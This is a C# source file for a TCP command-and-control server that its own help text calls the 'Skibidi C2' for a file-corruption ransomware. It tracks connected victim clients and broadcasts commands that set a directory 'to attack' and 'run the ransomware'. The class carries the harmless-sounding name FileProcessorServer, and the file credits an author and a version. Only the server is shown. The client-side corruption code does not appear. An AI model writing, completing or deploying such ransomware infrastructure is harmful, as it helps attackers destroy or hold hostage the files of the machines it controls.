using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace ServerApp
{
    class FileProcessorServer
    {
        private TcpListener listener;
        private List<TcpClient> clients = new List<TcpClient>();
        private readonly object lockObject = new object();
        private string directoryPath = "";

        public FileProcessorServer(string ipAddress, int port)
        {
            IPAddress localAddr = IPAddress.Parse(ipAddress);
            listener = new TcpListener(localAddr, port);
        }

        public async Task StartServerAsync()
        {
            listener.Start();
            Console.WriteLine($"Server started. Listening on {listener.LocalEndpoint}\n.");

            var commandTask = Task.Run(() => CommandLoop());

            while (true)
            {
                TcpClient client = await listener.AcceptTcpClientAsync();
                lock (lockObject)
                {
                    clients.Add(client);
                }
                string clientInfo = ((IPEndPoint)client.Client.RemoteEndPoint).ToString();
                Console.WriteLine($"\nClient connected: {clientInfo}\n");
                LogToFile($"Client connected: {clientInfo}");

                Task.Run(() => HandleClientAsync(client)).ContinueWith(t =>
                {
                    lock (lockObject)
                    {
                        clients.Remove(client);
                    }
                    Console.WriteLine($"\nClient disconnected: {clientInfo}\n");
                    LogToFile($"Client disconnected: {clientInfo}");
                });
            }
        }

        private async Task HandleClientAsync(TcpClient client)
        {
            string clientInfo = ((IPEndPoint)client.Client.RemoteEndPoint).ToString();
            try
            {
                using (var networkStream = client.GetStream())
                using (var reader = new StreamReader(networkStream))
                using (var writer = new StreamWriter(networkStream))
                {
                    writer.AutoFlush = true;
                    string message;
                    while ((message = await reader.ReadLineAsync()) != null)
                    {
                        LogToFile($"Received: {message} from {clientInfo}");
                        await writer.WriteLineAsync($"Echo: {message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error with client {clientInfo}: {ex.Message}");
                LogToFile($"Error with client {clientInfo}: {ex.Message}");
            }
            finally
            {
                client.Close();
            }
        }

        private void LogToFile(string message)
        {
            string logFilePath = "ServerLog.txt";
            using (StreamWriter writer = new StreamWriter(logFilePath, true))
            {
                writer.WriteLine($"{DateTime.UtcNow}: {message}");
            }
        }

        private void CommandLoop()
        {
            while (true)
            {
                Console.Write("C2 > ");
                string command = Console.ReadLine()?.Trim();
                HandleCommand(command);
            }
        }

        private void HandleCommand(string command)
        {
            while (true)
            {
                Console.WriteLine("\nEnter command (HELP for a list):");
                Console.Write("C2 > ");
                string commands = Console.ReadLine();
                string[] commandParts = commands.Split(new[] { ' ' }, 2);
                string action = commandParts[0];

                switch (action)
                {
                    case "HELP":
                        PrintHelp();
                        break;
                    case "SET_PATH":
                        SetPath(commandParts);
                        break;
                    case "GET_PATH":
                        Console.WriteLine("Current path: " + directoryPath);
                        break;
                    case "LIST":
                        ListConnectedClients();
                        break;
                    case "RUN":
                        BroadcastCommand("run");
                        break;
                    case "EXIT":
                        Environment.Exit(0);
                        break;
                    default:
                        Console.WriteLine("Unknown command.");
                        break;
                }
            }
        }

        private void PrintHelp()
        {
            Console.WriteLine("------------------------Welcome to the Skibidi C2.------------------------");
            Console.WriteLine("This is currently the C2 for a file corruption based ransomware.\n");
            Console.WriteLine("Use the following commands to configure the Server:");
            Console.WriteLine("    - SET_PATH <path>      set the path to attack");
            Console.WriteLine("    - RUN                  run the ransomware");
            Console.WriteLine("    - LIST                 list all connected clients\n\n");
            Console.WriteLine("Author: CyberYom");
            Console.WriteLine("Version: 0.0.1");
            Console.WriteLine("Support: GITHUB LINK");
        }

        private void SetPath(string[] commandParts)
        {
            if (commandParts.Length > 1)
            {
                string newPath = commandParts[1].Trim('"');  
                directoryPath = newPath;
                Console.WriteLine("Path set to " + newPath);

                BroadcastCommand($"SET_PATH \"{newPath}\""); 
            }
            else
            {
                Console.WriteLine("No path specified.");
            }
        }


        private void ListConnectedClients()
        {
            Console.WriteLine("Connected clients:");
            lock (lockObject)
            {
                foreach (TcpClient client in clients)
                {
                    string clientEndpoint = ((IPEndPoint)client.Client.RemoteEndPoint).ToString();
                    Console.WriteLine(clientEndpoint);
                }
            }
        }
        private void BroadcastCommand(string message)
        {
            lock (lockObject)
            {
                foreach (var client in clients)
                {
                    try
                    {
                        StreamWriter writer = new StreamWriter(client.GetStream()) { AutoFlush = true };
                        writer.WriteLine(message);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error broadcasting command: " + ex.Message);
                    }
                }
            }
        }


        //set server info
        static async Task Main(string[] args)
        {
            var server = new FileProcessorServer("192.168.104.9", 9999);
            await server.StartServerAsync();
        }
    }
}
